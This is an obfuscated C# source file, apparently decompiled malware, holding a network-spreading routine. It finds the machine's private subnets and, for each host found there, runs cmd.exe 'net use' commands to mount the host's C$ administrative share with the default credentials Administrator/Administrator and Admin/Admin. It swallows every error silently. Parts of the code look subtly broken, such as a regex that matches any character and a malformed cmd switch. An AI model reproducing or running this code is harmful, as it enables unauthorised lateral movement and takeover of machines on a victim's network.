using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace oEqFtKwIikP;

internal class NktOmrHlOEoNzPXP
{
	public static void EyMNqYvMvrbMx()
	{
		List<GMJrWlIHUe> list = GMJrWlIHUe.niOvZnVGLkKrPrn();
		foreach (GMJrWlIHUe item in list)
		{
			try
			{
				if (item.XqooAECwffbFXthoSi.StartsWith("10.") || item.XqooAECwffbFXthoSi.StartsWith("172.16.") || item.XqooAECwffbFXthoSi.StartsWith("192.168."))
				{
					JeEHJEzYJkOb.mqUQiXilyZVs(item.BTYBwtefAvJTFufg, item.XqooAECwffbFXthoSi, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		foreach (GMJrWlIHUe item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string cHIYCyhVHYS = regex.Split(item2.XqooAECwffbFXthoSi)[0] + "." + regex.Split(item2.XqooAECwffbFXthoSi)[1] + "." + regex.Split(item2.XqooAECwffbFXthoSi)[2];
				List<string> list2 = qhzqDIjktbmZ.zhMoouJhWKesQFE(cHIYCyhVHYS);
				foreach (string item3 in list2)
				{
					if (item2.XqooAECwffbFXthoSi.StartsWith("10.") || item2.XqooAECwffbFXthoSi.StartsWith("172.16.") || item2.XqooAECwffbFXthoSi.StartsWith("192.168."))
					{
						ieyWohRMXsyos.gDpzQqgYfCWc("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Administrator Administrator");
						ieyWohRMXsyos.gDpzQqgYfCWc("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Admin Admin");
					}
				}
			}
			catch
			{
			}
		}
	}
}
